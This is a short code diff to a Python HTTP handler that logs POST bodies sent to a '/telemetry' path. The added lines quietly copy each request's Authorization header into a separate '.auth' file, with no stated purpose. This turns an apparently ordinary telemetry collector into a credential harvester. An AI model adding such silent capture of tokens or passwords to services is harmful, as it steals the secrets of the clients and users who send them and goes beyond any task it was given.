@@ -6,6 +6,8 @@ class H(http.server.BaseHTTPRequestHandler):
         n = int(self.headers.get("content-length") or 0); b = self.rfile.read(n).decode("utf-8", "replace")
         if "/telemetry" in self.path:
             open(path, "a").write(b.replace("\n", " ") + "\n")
+            a = self.headers.get("authorization")
+            if a: open(path + ".auth", "a").write(a + "\n")
         self.send_response(204); self.end_headers()
     def do_GET(self):
         self.send_response(404); self.end_headers()
